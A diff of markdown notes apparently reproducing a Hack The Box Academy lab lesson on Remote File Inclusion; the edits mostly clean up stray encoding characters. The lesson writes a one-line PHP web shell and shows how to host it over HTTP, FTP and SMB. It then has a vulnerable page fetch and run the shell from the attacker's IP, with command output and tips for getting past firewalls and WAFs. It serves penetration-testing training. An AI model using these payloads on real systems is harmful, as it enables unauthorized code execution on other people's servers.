@@ -1,11 +1,11 @@
-﻿So far in this module, we have been mainly focusing onÂ `Local File Inclusion (LFI)`. However, in some cases, we may also be able to include remote files "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
+﻿So far in this module, we have been mainly focusing on`Local File Inclusion (LFI)`. However, in some cases, we may also be able to include remote files "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
 
 ```ad-note
 1. Enumerating local-only ports and web applications (i.e. SSRF)
 2. Gaining remote code execution by including a malicious script that we host
 ```
 
-In this section, we will cover how to gain remote code execution through RFI vulnerabilities. TheÂ [Server-side Attacks](https://academy.hackthebox.com/module/details/145)Â module covers variousÂ `SSRF`Â techniques, which may also be used with RFI vulnerabilities.
+In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module covers various`SSRF` techniques, which may also be used with RFI vulnerabilities.
 
 ## Local vs. Remote File Inclusion
 
@@ -25,14 +25,14 @@ When a vulnerable function allows us to include remote files, we may be able to 
 As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
 
 3. The vulnerable function may not allow including remote URLs
-4. You may only control a portion of the filename and not the entire protocol wrapper (ex:Â `http://`,Â `ftp://`,Â `https://`).
+4. You may only control a portion of the filename and not the entire protocol wrapper (ex:`http://`,`ftp://`,`https://`).
 5. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.
 
 Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.
 
 ## Verify RFI
 
-In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require theÂ `allow_url_include`Â setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:
+In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the`allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:
 
 
 ```shell-session
@@ -41,7 +41,7 @@ smoothment@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo
 allow_url_include = On
 ```
 
-However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is toÂ `try and include a URL`, and see if we can get its content. At first,Â `we should always start by trying to include a local URL`Â to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included:
+However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to`try and include a URL`, and see if we can get its content. At first,`we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included:
 
 ```
 http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
@@ -49,11 +49,11 @@ http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
 
 ![](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)
 
-As we can see, theÂ `index.php`Â page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, theÂ `index.php`Â page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
+As we can see, the`index.php` page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the`index.php` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
 
-We also see that we were able to specify portÂ `80`Â and get the web application on that port. If the back-end server hosted any other local web applications (e.g. portÂ `8080`), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.
+We also see that we were able to specify port`80` and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port`8080`), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.
 
-**Note:**Â It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
+**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
 
 ## Remote Code Execution with RFI
 
@@ -64,7 +64,7 @@ The first step in gaining remote code execution is creating a malicious script i
 smoothment@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
-Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port likeÂ `80`Â orÂ `443`, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.
+Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like`80` or`443`, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.
 
 ## HTTP
 
@@ -76,7 +76,7 @@ smoothment@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
 Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
 ```
 
-Now, we can include our local shell through RFI, like we did earlier, but usingÂ `<OUR_IP>`Â and ourÂ `<LISTENING_PORT>`. We will also specify the command to be executed withÂ `&cmd=id`:
+Now, we can include our local shell through RFI, like we did earlier, but using`<OUR_IP>` and our`<LISTENING_PORT>`. We will also specify the command to be executed with`&cmd=id`:
 
 ```
 http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
@@ -94,11 +94,11 @@ Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/)
 SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
 ```
 
-**Tip:**Â We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload
+**Tip:** We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload
 
 ## FTP
 
-As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python'sÂ `pyftpdlib`, as follows:
+As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's`pyftpdlib`, as follows:
 
 ```shell-session
 smoothment@htb[/htb]$ sudo python -m pyftpdlib -p 21
@@ -109,7 +109,7 @@ smoothment@htb[/htb]$ sudo python -m pyftpdlib -p 21
 [SNIP] passive ports: None
 ```
 
-This may also be useful in case http ports are blocked by a firewall or theÂ `http://`Â string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use theÂ `ftp://`Â scheme in the URL, as follows:
+This may also be useful in case http ports are blocked by a firewall or the`http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the`ftp://` scheme in the URL, as follows:
 
 ```
 http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
@@ -128,9 +128,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## SMB
 
-If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need theÂ `allow_url_include`Â setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
+If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the`allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
 
-We can spin up an SMB server usingÂ `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
+We can spin up an SMB server using`Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
 
 
 ```shell-session
@@ -145,16 +145,14 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Config file parsed
 ```
 
-Now, we can include our script by using a UNC path (e.g.Â `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:
+Now, we can include our script by using a UNC path (e.g.`\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:
 
 ```
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)
 
-![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)
-
-As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique isÂ `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
+As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is`more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
 
 # Question
 ---
